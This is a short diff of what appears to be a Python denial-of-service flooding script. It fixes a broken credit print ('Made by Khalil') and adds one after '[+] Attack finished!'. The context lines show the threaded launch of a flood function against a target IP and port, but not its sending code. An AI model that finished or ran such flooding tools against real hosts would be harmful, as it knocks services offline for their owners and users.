@@ -19,8 +19,7 @@ def flood():
         except:
             pass
 
-print(f"[+] Starting flood to {target_ip}:{target_port} with {threads} threads.
-Made by Khalil")
+print(f"[+] Starting flood to {target_ip}:{target_port} with {threads} threads.")
 for i in range(threads):
     t = threading.Thread(target=flood)
     t.daemon = True
@@ -28,3 +27,4 @@ for i in range(threads):
 
 time.sleep(duration)
 print("[+] Attack finished!")
+print("[+] Made by Khalil!")
